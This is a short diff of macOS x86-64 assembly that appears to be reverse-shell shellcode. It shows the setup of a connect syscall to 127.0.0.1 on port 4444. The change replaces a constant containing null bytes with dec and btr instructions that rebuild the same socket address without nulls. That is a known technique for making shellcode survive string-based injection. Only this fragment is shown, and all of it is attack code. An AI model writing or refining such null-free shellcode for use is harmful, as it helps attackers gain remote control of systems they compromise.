@@ -33,7 +33,10 @@ _main:
     ; 98	AUE_CONNECT	ALL	{ int connect(int s, caddr_t name, socklen_t namelen) NO_SYSCALL_STUB; }
     xor     rbx, rbx
     push    rbx                         ; name.sin_zero
-    mov     rbx, 0x0100007f5c110200     
+    mov     rbx, 0x0101017f5c110201
+    dec     rbx
+    btr     rbx, 40
+    btr     rbx, 48   
     push    rbx
     push    rsp
     pop     rsi                         ; name
